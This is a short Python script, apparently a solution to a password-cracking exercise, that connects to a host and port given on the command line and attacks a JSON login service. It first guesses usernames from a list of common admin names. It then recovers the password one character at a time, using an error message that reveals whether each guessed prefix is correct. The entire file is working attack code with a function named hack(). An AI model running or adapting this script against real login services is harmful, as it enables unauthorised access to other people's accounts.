import socket
import sys
import itertools
import json
import string

logins_list = [
	"admin", "Admin", "admin1", "admin2", "admin3",
	"user1", "user2", "root", "default", "new_user",
	"some_user", "new_admin", "administrator",
	"Administrator", "superuser", "super", "su", "alex",
	"suser", "rootuser", "adminadmin", "useruser",
	"superadmin", "username", "username1"
]
args = sys.argv
host = args[1]
port = int(args[2])


def try_logins(logins, client_socket):
	for login in logins:
		login = login.strip()
		message = json.dumps({"login": login, "password": ' '})
		client_socket.send(message.encode())
		response = json.loads(client_socket.recv(1024))
		if response["result"] == "Wrong password!":
			return login


def next_symbol():
	yield from itertools.cycle(string.digits + string.ascii_letters)


def try_passwords(login, client_socket):
	password = ''
	symbols = next_symbol()
	for symbol in symbols:
		new_password = password + symbol
		message = json.dumps({"login": login, "password": new_password})
		client_socket.send(message.encode())
		response = json.loads(client_socket.recv(1024))
		if response["result"] == 'Connection success!':
			print(json.dumps({"login": login, "password": new_password}))
			break
		if response["result"] == 'Exception happened during login':
			password = new_password


def hack():
	with socket.socket() as client_socket:
		address = (host, port)
		client_socket.connect(address)
		login = try_logins(logins_list, client_socket)
		try_passwords(login, client_socket)


hack()
